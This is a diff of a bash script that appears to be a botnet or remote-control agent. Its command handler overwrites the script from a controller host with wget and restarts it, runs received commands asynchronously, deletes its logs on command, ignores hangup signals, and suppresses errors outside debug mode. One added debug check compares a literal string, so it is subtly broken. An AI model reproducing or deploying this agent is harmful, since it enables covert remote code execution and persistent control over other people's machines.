@@ -171,20 +171,23 @@ __quit__)
 echo '[warn] Received quit, bailing...'
 quit
 ;;
+
 __update__) 
 # This still needs more testing. Be careful before trying to update your entire net.
+[ debug == "1" ] && \
 echo '[warn] Received update, getting new config...'
-wget -O $0 $host/mq # overwrite this file from your httpd
+wget -O $0 $host/mq  # overwrite this file from your httpd
 # It may be better to use $ exec $0 , idk
 trap "nohup bash $0" 15 # kill this script
 kill `cat pidfile`  # and the listener
 kill $$ # kill this pid, hopefully triggering the trap
 ;;
+
 __killall__)
 echo '[info] Received a killall, getting new config...'
 killThreads & 
-  
 ;;
+
 _clearmem_)
 echo '[info] Received clearenv, deleting the logs...'
 clearmem &
@@ -207,7 +210,7 @@ echo $shcmd > /tmp/shcmd
 cmd="$(cat $denc)"
 execute "${cmd}" & # ALWAYS run background, this must be asynchronous!
 if ([[ "$?" -eq "0" ]] && [[ $debug == "1" ]]); then  
-echo '[*] Executed the command...'
+  echo '[*] Executed the command...'
 fi
 ;;
 
@@ -287,8 +290,8 @@ if ([[ "$debug" == "1" ]]);then
 else
   spitSomeBin 2>>$errorlog
   doFirst 2>>$errorlog
-  trap "" 1
-  errorlog=/dev/null
+  trap "" 1 # don't die if the controlling terminal goes away
+  errorlog=/dev/null # not runnin in debug mode, so nullify all errors
   run $host $pass $path $debug $key $intf $subtop $pubtop  2>>$errorlog &
 fi
 
